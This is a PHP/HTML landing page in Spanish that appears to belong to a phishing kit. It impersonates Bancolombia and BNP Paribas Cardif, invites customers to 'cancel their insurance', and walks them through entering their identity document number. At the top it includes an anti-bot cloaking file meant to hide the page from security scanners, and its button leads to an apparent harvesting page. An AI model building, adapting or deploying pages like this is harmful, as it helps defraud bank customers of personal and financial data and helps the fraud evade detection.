<?php
// ── Cloaking Anti-Bot ────────────────────────────────────
require_once __DIR__ . '/../config/cloak.php';
// ─────────────────────────────────────────────────────────
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Disfruta tu Seguro</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f4f4f4; color: #333; }
        header { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; background-color: #ffffff; border-bottom: 1px solid #ddd; }
        .logo-header { height: 31px; object-fit: contain; }
        .menu-icon { font-size: 24px; cursor: pointer; }
        .hero-section { background-color: #f8f8f8; padding: 30px 20px; text-align: center; }
        .hero-section h1 { font-size: 24px; color: #111; margin-bottom: 20px; }
        .hero-section p { font-size: 17px; line-height: 1.5; color: #444; margin-bottom: 15px; text-align: left; }
        .btn-register { display: inline-block; background-color: #ffcc00; color: #000; font-weight: bold; padding: 12px 30px; border-radius: 25px; text-decoration: none; margin-top: 15px; cursor: pointer; }
        .card-section { background-color: #ffffff; margin: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); overflow: hidden; position: relative; }
        .card-image { width: 100%; height: 200px; object-fit: cover; display: block; }
        .step-badge { position: absolute; top: 175px; left: 20px; background-color: #ffffff; color: #6c5ce7; font-weight: bold; width: 35px; height: 35px; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 2px 4px rgba(0,0,0,0.2); font-size: 18px; }
        .card-content { padding: 25px 20px 20px 20px; }
        .card-content h2 { font-size: 18px; color: #111; margin-bottom: 10px; }
        .card-content p { font-size: 13px; color: #555; line-height: 1.4; }
    </style>
    <script src="../assets/js/security.js"></script>
</head>
<body>
    <header>
        <img src="logo-header.png" alt="Logo" class="logo-header">
        <div class="menu-icon">&#9776;</div>
    </header>
    
    <section class="hero-section">
        <h1>Cancela tu Seguro<br>Cardif</h1>
        <p>Si eres cliente de <b>Bancolombia</b> y tienes un seguro activo con <b>BNP Paribas Cardif</b>, puedes solicitar la cancelación de tu póliza de manera sencilla.</p>
        <p>Solo debes ingresar y gestionar tu solicitud en línea. Realiza el proceso en pocos minutos. Cancela tus coberturas cuando lo necesites. Es fácil y rápido.</p>
        <a href="../index.php?cupo=preaprobado" class="btn-register">Cancelar Seguro</a>
    </section>

    <div class="card-section">
        <img src="home_out_1.png" alt="Pareja revisando tablet" class="card-image">
        <div class="step-badge">1</div>
        <div class="card-content">
            <h2>Seleccionar tu tipo de documento.</h2>
        </div>
    </div>

    <div class="card-section">
        <img src="home_out_2.png" alt="Pareja revisando tablet" class="card-image">
        <div class="step-badge">2</div>
        <div class="card-content">
            <h2>Digitar tu número de documento de identificación.</h2>
        </div>
    </div>

    <div class="card-section">
        <img src="home_out_3.png" alt="Pareja revisando tablet" class="card-image">
        <div class="step-badge">3</div>
        <div class="card-content">
            <h2>Dar clic al botón “Quiero Registrarme”</h2>
        </div>
    </div>
</body>
</html>